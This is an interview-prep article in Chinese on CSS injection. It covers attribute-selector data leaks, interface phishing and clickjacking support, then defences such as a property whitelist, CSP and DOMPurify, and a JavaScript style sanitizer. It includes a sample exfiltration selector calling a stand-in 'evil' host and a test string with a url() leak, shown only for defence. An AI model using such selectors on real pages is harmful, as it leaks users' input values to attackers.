---
title: [PER-609] CSS 注入能做什么坏事？style 属性和 <style> 标签注入的实际危害与防护
date: 2026-11-20
categories: [性能与安全]
tags: [前端面试, 面试题, 09]
type: 面试题
---

## PER-609：CSS 注入能做什么坏事？style 属性和 <style> 标签注入的实际危害与防护

**答**：
- CSS 注入的实际危害有三类：**数据外泄**（利用属性选择器做字符探测：`input[value^="a"] { background: url(//evil/a) }` 逐字符外传输入值）、**界面钓鱼**（覆盖/隐藏元素、伪造按钮位置诱导点击）、**点击劫持辅助**（配合 UI 重排放大劫持成功率）——CSS 不能执行 JS 但能偷数据。
- 攻击前提：受害者页面存在用户可控 CSS 注入点 + 敏感数据在同一 DOM 里可被选择器探测"（如自定义主题、富文本 style 属性、评论内嵌 style）。
- 防护：style 属性走**CSS 属性白名单**（只留 color/font-size 等视觉属性，禁 background/url/position/behavior）；`<style>` 标签整体剔除或服务端净化；CSP `style-src 'self'`（禁 inline style 会破坏业务，折中用 nonce 管理合法 inline）。
- 富文本场景的落地：DOMPurify 默认剥除 style，要放开时用 `ALLOWED_ATTR + 钩子`逐属性校验，绝不允许 url() 值。

```javascript

// CSS 属性白名单净化器：style 属性专用
const SAFE_PROPS = new Set(['color', 'background-color', 'font-size', 'font-weight',
  'text-align', 'margin', 'padding', 'border-radius']);
const URL_LIKE = /url\s*\(|expression|@import|javascript:/i;
function sanitizeStyle(styleText) {
  return styleText.split(';').map(decl => {
    const [prop, ...rest] = decl.split(':');
    const value = rest.join(':').trim();
    if (!prop || value === undefined) return '';
    const p = prop.trim().toLowerCase();
    if (!SAFE_PROPS.has(p)) return '';                      // 白名单外一律剥除
    if (URL_LIKE.test(value)) return '';                    // url()/expression 双保险
    return `${p}: ${value}`;
  }).filter(Boolean).join('; ');
}
// sanitizeStyle('color: red; background: url(//evil.com/leak?d=1); position: fixed')
// => 'color: red'   —— 数据外泄与定位钓鱼两条路都被切断
```
